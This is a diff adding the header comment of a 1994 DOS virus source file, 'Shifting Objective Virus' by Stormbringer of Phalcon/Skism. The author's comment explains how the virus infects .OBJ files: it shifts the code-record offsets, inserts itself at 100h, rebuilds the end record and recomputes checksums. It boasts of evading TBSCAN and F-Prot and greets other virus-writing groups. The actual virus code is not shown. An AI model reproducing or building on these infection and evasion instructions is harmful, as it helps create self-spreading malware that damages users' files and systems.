@@ -1,0 +1,59 @@
+;����������������������������������������������������������������������ͻ
+;�  Shifting Objective Virus 3.0 (c) 1994 Stormbringer [Phalcon/Skism]  �
+;�                                                                      �
+;�  Memory Resident .OBJ Infector - No TBSCAN Flags, No F-Prot Alarms!  �
+;�                                                                      �
+;�  This virus breaks new bounds in viral technology, best I know }-)   �
+;�It infects .OBJ files that are set up to compile to simple, stand-    �
+;�alone .COM's.  The basic theory for this is the following:  It takes  �
+;�the pre-set compiling points of the modules in the .OBJ and moves them�
+;�up in memory so Objective will have room to insert itself underneath. �
+;�When the file is compiled the virus is at the beginning of the file,  �
+;�and the original code follows BUT - the original code's memory offsets�
+;�are what they were BEFORE the virus infected the .OBJ.  Therefore, all�
+;�Objective has to do when it runs is go memory resident, and shift the �
+;�host code back down to where it starts at 100h in memory, and all is  �
+;�well.                                                                 �
+;�                                                                      �
+;�  Object files are basically a set of linked lists or fields, each    �
+;�with a three byte header.  The first byte is it's identity byte, while�
+;�the following word is the size of the field - header.  The very last  �
+;�byte of each record is a simple checksum byte - this can be gained    �
+;�simply by adding up all of the bytes in the field save the three byte �
+;�header and taking the negative (not reg/inc reg) so that the entire   �
+;�field value + checksum = 0.  Each field type has it's own identity    �
+;�value, but we are only concerned with a few right now.                �
+;�                                                                      �
+;�They are as follows:                                                  �
+;�             80h  -  Starting field of a .OBJ file                    �
+;�             8Ch  -  External definitions                             �
+;�             8Ah  -  Ending field of a .OBJ file                      �
+;�             A0h  -  Regular Code                                     �
+;�             A2h  -  Compressed code (patterns/reiterated stuff)      �
+;�                                                                      �
+;�   In the A0h and A2h types of fields, there is one more thing that   �
+;�concerns us - the three bytes after the field size in the header      �
+;�are indicators of the location in memory the code will be at - the    �
+;�second and third byte form the word we will be concerned with, which  �
+;�is a simple offset from CS:0000 that the code will begin.  Since we   �
+;�are dealing with .COM files and want to put our virus at the beginning�
+;�of the file, we set the position field of the virus to 100h and the   �
+;�positions of all the other A0h and A2h fields to their old position   �
+;�plus the virus size.  When the file is compiled, the virus will be    �
+;�at the beginning and the host will follow.  Attaching the virus to    �
+;�the .OBJ itself is simple enough - just save the 8Ah field in memory, �
+;�and write FROM IT'S OLD BEGINNING a header for your virus, your       �
+;�virus, then a checksum and the old 8Ah field.  At all times when      �
+;�modifying fields, the checksums must be fixed afterwards.             �
+;�                                                                      �
+;�   For the rest of the techniques that may be useful, I suggest you   �
+;�look at the following code for my Shifting Objective Virus.  I'd like �
+;�to thank The Nightmare for his ideas on this when we sat around bored �
+;�those days.  Greets go out to all of Phalcon/Skism, Urnst Kouch,      �
+;�Mark Ludwig, TridenT, NuKE, and the rest of the viral community.      �
+;�A special hello goes to Hermanni and Frisk.                           �
+;�                                                                      �
+;�                                           �  Stormbringer [P/S]      �
+;�                                         ���������������������       �
+;�                                           �                          �
+;����������������������������������������������������������������������ͼ
